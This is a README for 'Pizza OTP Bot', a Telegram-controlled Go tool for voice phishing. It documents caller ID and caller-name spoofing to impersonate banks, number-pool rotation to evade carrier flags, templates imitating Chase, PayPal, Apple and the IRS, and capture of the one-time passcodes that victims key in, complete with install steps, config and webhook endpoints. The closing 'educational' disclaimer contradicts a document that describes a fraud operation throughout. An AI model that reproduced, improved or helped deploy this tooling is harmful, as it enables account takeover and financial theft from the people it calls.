# 🍕 Pizza OTP Bot - Advanced Voice Phishing System

A powerful Telegram bot for conducting OTP voice phishing campaigns with advanced caller ID spoofing, real-time tracking, and an intuitive UI.

## ⚡ Features

### 🎭 Advanced Caller ID Spoofing
- **Caller Name Display** - Show bank names like "Chase Bank" on victim's phone instead of a number
- **Number Pool Rotation** - Use multiple verified numbers to avoid carrier flags
- **CNAM Lookup Control** - Toggle CNAM lookup behavior
- **STIR/Shaken Support** - Certificate-based caller verification (when available)

### 📊 Real-Time Dashboard
- Live campaign progress tracking
- Active call monitoring
- Success rate calculations
- One-click campaign management

### 📁 Template Categories
Organize your phishing templates by category:
- 🏦 Banking (Chase, Bank of America, Wells Fargo, etc.)
- 💻 Tech (Apple, Google, Amazon, Microsoft)
- 🛒 E-Commerce (PayPal, Netflix, Amazon)
- 📱 Social (Instagram, Facebook, Twitter)
- 🏛️ Government (IRS, SSA, FBI)
- 📌 Other

### 📞 Call Features
- **Voicemail Detection** - Automatically detect and skip answering machines
- **DTMF Capture** - Capture OTP codes entered by victims
- **Dynamic Variables** - Template personalization (victim_name, amount, order_id)
- **Concurrency Control** - Adjust simultaneous call volume

### 🔒 Security Features
- Admin-only access via Telegram
- Phone number masking in exports
- Activity logging
- Database backup

## 🚀 Quick Start

### Prerequisites
- Go 1.21+
- Telegram Bot Token (from @BotFather)
- Plivo Account with verified phone numbers

### Installation

```bash
# Clone the repository
git clone https://github.com/USERNAME/goland-otpbot-api.git
cd goland-otpbot-api

# Install dependencies
go mod download

# Copy and configure
cp config.yml.example config.yml
nano config.yml  # Edit with your credentials

# Run
go run main.go
```

### Configuration

Edit `config.yml`:

```yaml
# Telegram Bot Token
bot_token: "your_telegram_bot_token"

# Plivo Credentials
plivo_auth_id: "PAXXXXXXXXXX"
plivo_auth_token: "your_auth_token"
plivo_number: "+15551234567"

# Caller ID Spoofing (CRITICAL)
caller_id: "+15559876543"      # Spoofed number
caller_name: "Chase Bank"      # Shows as "Chase Bank" on victim's phone!

# Admin IDs
admin_ids:
  - 123456789
```

## 📱 Commands

| Command | Description |
|---------|-------------|
| `/start` | Show main menu |
| `/menu` | Show main menu |
| `/call <phone> <service>` | Make single call |
| `/batch` | Start batch campaign (reply to CSV) |
| `/campaigns` | List all campaigns |
| `/campaign <id>` | Campaign details |
| `/templates` | List service templates |
| `/template <name>` | Template details |
| `/stats` | Global statistics |
| `/logs` | Recent logs |
| `/export` | Export captures to CSV |
| `/config` | Show configuration |
| `/help` | Show help |

## 🏦 Template System

Templates use variables for personalization:

```
{{victim_name}} - Customer name (e.g., "Dear Customer")
{{amount}} - Transaction amount (e.g., "$450.24")
{{order_id}} - Order reference (e.g., "ORD-12345")
```

### Default Templates

| Service | Voice | Category |
|---------|-------|----------|
| chase | en-US-WOMAN | Banking |
| bank_of_america | en-US-WOMAN | Banking |
| paypal | en-US-WOMAN | E-Commerce |
| amazon | en-US-WOMAN | E-Commerce |
| netflix | en-US-WOMAN | E-Commerce |
| apple | en-US-WOMAN | Tech |
| google | en-US-WOMAN | Tech |

## 🎯 Usage Flow

### Single Call
1. Click **Single Call** in menu
2. Enter phone number
3. Select service template
4. Confirm call
5. Monitor in real-time

### Batch Campaign
1. Click **Batch Campaign**
2. Reply to CSV file with phone numbers
3. Select service template
4. Confirm campaign
5. Monitor progress via dashboard

## 📈 API Reference

### Plivo Call Parameters

```go
voice.CallRequest{
    From:        callerID,           // Spoofed number
    To:          victimPhone,        // Target number
    CallerName:  "Chase Bank",      // Display name on phone
    TimeLimit:   30,                // Max call duration
    RingTimeout: 30,                // Ring timeout
    // ... webhook URLs
}
```

### Webhook Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/answer/:campaign/:call/` | POST | Call answered - play greeting |
| `/hangup/:campaign/:call/` | POST | Call ended |
| `/ring/:campaign/:call/` | GET | Phone ringing |
| `/machine/:campaign/:call/` | POST | Voicemail detected |
| `/capture_otp/:campaign/:call/` | POST | DTMF digits entered |
| `/error/:campaign/:call/` | POST | Call error |

## ⚙️ Advanced Configuration

### Caller ID Pool

```yaml
randomize_caller_id: true
caller_id_pool:
  - "+15551111111"
  - "+15552222222"
  - "+15553333333"
```

### Voicemail Detection

```yaml
machine_detection: true
ring_timeout: 30
```

## 📦 Database

The bot uses SQLite for data storage:

- `campaigns` - Campaign records
- `calls` - Individual call records
- `captures` - Captured OTPs
- `templates` - Service templates
- `logs` - Activity logs

## 🔧 Development

```bash
# Run tests
go test ./...

# Build binary
go build -o pizza-otp-bot main.go

# Run with Docker
docker-compose up -d
```

## 📜 License

MIT License - See LICENSE file

## ⚠️ Disclaimer

This tool is for **educational and authorized security testing purposes only**. Unauthorized use against systems you don't own or have explicit permission to test is illegal.

---

*Built with ❤️ for security research*
